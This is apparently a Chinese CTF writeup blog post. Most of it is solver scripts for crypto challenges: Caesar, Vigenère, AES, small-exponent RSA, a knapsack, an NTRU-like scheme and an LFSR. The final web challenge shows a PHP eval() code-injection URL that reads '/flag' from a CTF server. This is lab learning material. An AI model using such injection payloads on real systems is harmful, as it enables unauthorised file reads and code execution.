---
title: "npccctf第一周wp"
date: 2025-02-24 15:42:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "NPCCCTF"
cnblogs_postid: "18734223"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18734223"
---

# 1、全网呼叫密码人

题目

```Python
from Crypto.Cipher import AES
from Crypto.Util.number import *
from Crypto.Util.Padding import pad
"""
Dinzheng先生准备去买一根RuiKeV电子烟，在付款的时候忘记了它的支付密码。
还好他的朋友早有准备，留下了若干个密保问题，你能从中获取秘密的信息（flag）吗？
"""
flag=b"flag{?????}"

assert len(flag)==64

piece=[flag[i:i+8] for i in range(0,64,8)]

#-----密保问题----- : 李唐王有可能是凯撒，但李唐王是凯撒不大可能
print(''.join(chr(piece[0][i]-2) for i in range(8)))
"""
dj_ey//)
flag{11+
"""

#-----密保问题-----: 是谁来着...维十戴尔？王维那？哦哦哦！是维吉尼亚
"""
Ofqi ht wj, fdpsxvp, ityg cgux tqi egtbvvb. Lx ypfu iaov flt woa nc bngv ugt, uiv lqjtznp ut iweksgx hjrr stm cj dpk wp kft yivlpt. Pvge ut tfg zl qncarli asccrw, wsckf xl onc zjm ipzkpzwprzax. Kg jcawco kfxgy qw gi. Mvg uynl gvicivv qlr xg op vlsesuj txlhc. Jm lx uq rzdnh qlp exhvp rplyu, yygwza rupks qw mjk zkjraxgu rribhwuc ihkcib abtg.Rls mvg jcrhbf ggtvs kj "ztewg5!_"

belie5!_
"""

#-----密保问题----- : Avemujica rosElia raS
key =iv = b'1234567890123456';cipher = AES.new(key, AES.MODE_CBC, iv);ppiece = pad(piece[2], AES.block_size);print(cipher.encrypt(ppiece))
"""
b"'*\xc0m\xd0&\xcb\x18\xf3z\xfa\xf0n\xc9<\xf1"

U_are_th
"""

#-----密保问题----- : 密码人不语，只是一味的梭哈RSA。
print(long_to_bytes(pow(bytes_to_long(piece[3]),3,getPrime(512)**2)))
"""
b'\x0f\xe5Q\xa5_\x16q\xb0\x11\xbd\xdbO\xe803\xf7\xbf\x16R\xdd\xac\x1a\x96\xf9'

e_best_i
"""

#-----密保问题----- : 但是，RSA vs PACK,你知道吗？什么？不会吧？真的吗？怎么可能？
print(long_to_bytes(sum(int(str(bin(bytes_to_long(piece[4]))[2:])[i]) * [3**i for i in range(80)][i] for i in range(63))))
"""
b'\x07)\x19\x12D\x18\xdc\xf7r\xe1\x7f\xb0}'
n_crypto
"""

#-----密保问题----- : 你的 N  我的 TRU
g=2**521-1;f=2*555;p=2**607-1
h=g*inverse(f,p)%p
c=(114514*h+bytes_to_long(piece[5]))%p
print(long_to_bytes(c))
"""

b'v\x8bM\x07\xd7h\xb4\xd0}wY\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\xe5\x9d\x86\xd2\xe4\xd0\x06\xed'

_challen
"""

#-----密保问题----- : 你出的什么78密码？
"""
b'ge_and_have_fun}'
"""
```

## 第一部分：简单凯撒

```Python
words='dj_ey//)'
for i in range(len(words)):
    print(chr(ord(words[i])+2),end='')
```

## 第二部分：维吉尼亚密码

先初步筛选

```Python
'''维吉尼亚破解'''
import numpy as np
import wordninja


def alpha(cipher):  # 预处理,去掉空格以及回车
    c = ''
    for i in range(len(cipher)):
        if (cipher[i].isalpha()):
            c += cipher[i]
    return c


def count_IC(cipher):  # 给定字符串计算其重合指数
    count = [0 for i in range(26)]
    L = len(cipher)
    IC = 0.0
    for i in range(len(cipher)):
        if (cipher[i].isupper()):
            count[ord(cipher[i]) - ord('A')] += 1
        elif (cipher[i].islower()):
            count[ord(cipher[i]) - ord('a')] += 1
    for i in range(26):
        IC += (count[i] * (count[i] - 1)) / (L * (L - 1))
    return IC


def count_key_len(cipher, key_len):  # 对字符串按输入个数进行分组，计算每一组的IC值返回平均值
    N = ['' for i in range(key_len)]
    IC = [0 for i in range(key_len)]
    for i in range(len(cipher)):
        m = i % key_len
        N[m] += cipher[i]
    for i in range(key_len):
        IC[i] = count_IC(N[i])
    # print(IC)
    print("长度为%d时,平均重合指数为%.5f" % (key_len, np.mean(IC)))
    return np.mean(IC)


def length(cipher):  # 遍历确定最有可能的密钥长度返回密钥长度
    key_len = 0
    mins = 100
    aver = 0.0
    for i in range(1, 10):
        k = count_key_len(cipher, i)
        if (abs(k - 0.065) < mins):
            mins = abs(k - 0.065)
            key_len = i
            aver = k
    print("密钥长度为%d,此时重合指数每组的平均值为%.5f" % (key_len, aver))
    return key_len


def count_MIC(c1, c2, n):  # n=k1-k2为偏移量,计算c1,c2互重合指数MIC
    count_1 = [0 for i in range(26)]
    count_2 = [0 for i in range(26)]
    L_1 = len(c1)
    L_2 = len(c2)
    MIC = 0
    for i in range(L_1):
        if (c1[i].isupper()):
            count_1[ord(c1[i]) - ord('A')] += 1
        elif (c1[i].islower()):
            count_1[ord(c1[i]) - ord('a')] += 1
    for i in range(L_2):
        if (c2[i].isupper()):
            count_2[(ord(c2[i]) - ord('A') + n + 26) % 26] += 1
        elif (c2[i].islower()):
            count_2[(ord(c2[i]) - ord('a') + n + 26) % 26] += 1
    for i in range(26):
        MIC += count_1[i] * count_2[i] / (L_1 * L_2)
    return MIC


def count_n(c1, c2):  # 确定两个子串最优的相对偏移量n=k1-k2
    n = 0
    mins = 100
    k = [0.0 for i in range(26)]
    for i in range(26):
        k[i] = count_MIC(c1, c2, i)
        # print(i,k[i])
        if (abs(k[i] - 0.065) < mins):
            mins = abs(k[i] - 0.065)
            n = i
    return n


def group_k(cipher, key_len):  # 完成分组操作并计算每一组与第一组的最优相对偏移量并返回
    N = ['' for i in range(key_len)]
    MIC = [0 for i in range(key_len)]
    s = [0 for i in range(key_len)]
    for i in range(len(cipher)):  # 对密文进行分组
        m = i % key_len
        N[m] += cipher[i]
    for i in range(1, key_len):  # 计算与第一组之间的相对偏移量
        s[i] = count_n(N[0], N[i])  # s[i] = k1-k(i+1)
        MIC[i] = count_MIC(N[0], N[i], s[i])  # MIC[i] = MIC(1,i+1)
        print("第1组和第%d组之间偏移为%d时，互重合指数为%.5f" % (i + 1, s[i], MIC[i]))
    return s


def miyao(key_len, s, k):  # k为第一个子串的移位，输出密钥并返回密钥所有字母的下标
    mi = ['' for i in range(key_len)]
    for i in range(key_len):
        s[i] = -s[i] + k  # k2=k1-n
        mi[i] = chr((s[i] + 26) % 26 + ord('a'))
    print("第一个偏移量为%d,密钥为%s时" % (k, mi))
    return s


def the_end(cipher, key_len, s):  # 输入密文密钥返回明文结果
    plain = ''
    i = 0
    while (i < len(cipher)):
        for j in range(key_len):
            if (cipher[i].isupper()):
                plain += chr((ord(cipher[i]) - ord('A') - s[j] + 26) % 26 + ord('A'))
            else:
                plain += chr((ord(cipher[i]) - ord('a') - s[j] + 26) % 26 + ord('a'))
            i += 1
            if (i == len(cipher)):
                break
                # print(plain)
    return plain


if __name__ == "__main__":
    cipher = 'Ofqi ht wj, fdpsxvp, ityg cgux tqi egtbvvb. Lx ypfu iaov flt woa nc bngv ugt, uiv lqjtznp ut iweksgx hjrr stm cj dpk wp kft yivlpt. Pvge ut tfg zl qncarli asccrw, wsckf xl onc zjm ipzkpzwprzax. Kg jcawco kfxgy qw gi. Mvg uynl gvicivv qlr xg op vlsesuj txlhc. Jm lx uq rzdnh qlp exhvp rplyu, yygwza rupks qw mjk zkjraxgu rribhwuc ihkcib abtg.Rls mvg jcrhbf ggtvs kj "ztewg5!_"'
    cipher = alpha(cipher)
    key_len = length(cipher)
    s = group_k(cipher, key_len)
    m = s.copy()
    for k in range(26):
        s = m.copy()
        s = miyao(key_len, s, k)
        plain = the_end(cipher, key_len, s)
        print(plain[0:20])  # 输出部分明文确定偏移量k1
    print("参考输出，请输入第一个子串的偏移量:", end='')
    k = int(input())
    m = miyao(key_len, m, k)
    plain = the_end(cipher, key_len, m)

    '''对英文文本进行分词'''
    word = wordninja.split(plain)
    plain = ''
    for i in range(len(word)):
        plain += word[i]
        plain += ' '
    print("明文为\n" + plain)

```

```
第一个偏移量为2,密钥为['c', 'r', 'y', 'e', 't', 'o']时
Moseofushzwevereakel
```

找到上面这个偏移量很可疑，联想可能密钥是crypto

```
参考输出，请输入第一个子串的偏移量:2
第一个偏移量为2,密钥为['c', 'r', 'y', 'e', 't', 'o']时
明文为
Mos e of us hz we vere ak eli qe for g canted He know e hato np day we xu st dip but usf ally wp pic tuc e that o aya sfl r in th p fu tur p When wp are in mu oya ne he a lts death ts all b ft uni ml gina b we We sew dom th tn kofi e The da js s tree ch out tna ne no less vt st a So he go ab zu tour a e tty tls k shac dl yawl re of of r list wes sate it ude eow ard wife A no these non dpi pc eisb p lie 
```

![image](/assets/cnblogs/npccctf第一周wp/3539156-20250224154051027-1446987486.png)


## 第三部分：AES加密

```Python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 给定的密钥和IV
key = iv = b'1234567890123456'

# 给定的加密数据（以Python字面量的形式）
encrypted_data = b"'*\xc0m\xd0&\xcb\x18\xf3z\xfa\xf0n\xc9<\xf1"

# 初始化AES解密对象
cipher = AES.new(key, AES.MODE_CBC, iv)

# 解密数据
decrypted_padded = cipher.decrypt(encrypted_data)

# 去填充
try:
    decrypted_data = unpad(decrypted_padded, AES.block_size)
    print("解密后的明文:", decrypted_data.decode())
except ValueError:
    print("解密后数据格式错误，可能是填充不正确或密钥/IV错误")
```

## 第四部分：RSA

```Python
from Crypto.Util.number import long_to_bytes, bytes_to_long
from gmpy2 import iroot

ciphertext = b'\x0f\xe5Q\xa5_\x16q\xb0\x11\xbd\xdbO\xe803\xf7\xbf\x16R\xdd\xac\x1a\x96\xf9'
c = bytes_to_long(ciphertext)
m, is_exact = iroot(c, 3)
if is_exact:
    piece_3 = long_to_bytes(m)
    print(piece_3)
else:
    print("无法精确求解立方根")
```

## 第五部分：

```Python
from Crypto.Util.number import bytes_to_long, long_to_bytes

output = b'\x07)\x19\x12D\x18\xdc\xf7r\xe1\x7f\xb0}'
S = bytes_to_long(output)

bits = [0] * 63
remaining = S

for i in reversed(range(63)):
    power = 3 ** i
    if power <= remaining:
        bits[i] = 1
        remaining -= power
    if remaining == 0:
        break

# 构造二进制字符串，i从0到62对应bits的索引0到62
bin_str = ''.join(map(str, bits))
integer = int(bin_str, 2)
piece_4 = long_to_bytes(integer)

print(f"piece[4] = {piece_4}")
```

## 第六部分：

```Python
from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse

g = 2**521 - 1
f = 2 * 555
p = 2**607 - 1
h = g * inverse(f, p) % p

ciphertext = b'v\x8bM\x07\xd7h\xb4\xd0}wY\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\x86:\x1eqxc\xa1\xe7\x17\xe5\x9d\x86\xd2\xe4\xd0\x06\xed'
c = bytes_to_long(ciphertext)

piece_5 = (c - 114514 * h) % p
piece_5_bytes = long_to_bytes(piece_5)
print(piece_5_bytes)
```

# 2、river

```Python
class LFSRStreamCipher:
    def __init__(self, key: int):
        if not (0 <= key < 2**16):
            raise ValueError("Key must be a 16-bit integer")
        self.state = key
        self.poly = 0b1010000000000101  # 反馈多项式: x^16 + x^14 + x^13 + x^11 + 1

    def lfsr_step(self) -> int:
        feedback = self.state & 1
        self.state >>= 1
        if feedback:
            self.state ^= self.poly
        return feedback

    def generate_keystream(self, length: int) -> bytes:
        keystream = bytearray()
        for _ in range(length):
            byte = 0
            for i in range(8):
                byte |= self.lfsr_step() << i
            keystream.append(byte)
        return bytes(keystream)

    def encrypt(self, plaintext: bytes) -> bytes:
        """使用密钥流加密"""
        keystream = self.generate_keystream(len(plaintext))
        return bytes(p ^ k for p, k in zip(plaintext, keystream))

    def decrypt(self, ciphertext: bytes) -> bytes:
        """使用密钥流解密（加密与解密是相同的）"""
        return self.encrypt(ciphertext)


# 提供的密钥
key = 0b1101011010110101
cipher = LFSRStreamCipher(key)

# 给定的密文（以十六进制字符串形式）
ciphertext_hex = "bd8b802f4a05ed77abace36b6cf9adbe627d3632edff818c556120ad131b50dbedd0f4af4483"
ciphertext = bytes.fromhex(ciphertext_hex)

# 解密过程
decrypted_message = cipher.decrypt(ciphertext)

print("Decrypted message:", decrypted_message)

```

# 3、**kotlin?**

玩到2048（什

# 4、**play a game**

找到可疑位置

![image](/assets/cnblogs/npccctf第一周wp/3539156-20250224154024886-697420551.png)


用burpsuite爆破得到score是114514

得到这个

```php
<?php
error_reporting(0);

if (base64_encode($_GET['score']) == 'MTE0NTE0') {
    highlight_file(__FILE__);
}
else echo "MTE0NTE0说:你的分数不是它想要的";

$func=$_GET['func'];
$arg=$_GET['arg'];
if($func!=$arg||md5($func)==md5($arg)){
    eval($func.$arg);
}

?>
```

再构造就可以获得flag

```
http://175.27.249.18:30210/check.php?score=114514&func=echo%20file_get_contents(%27/flag%27);%2F%2F&arg=
```

![image](/assets/cnblogs/npccctf第一周wp/3539156-20250224154033705-1677367068.png)
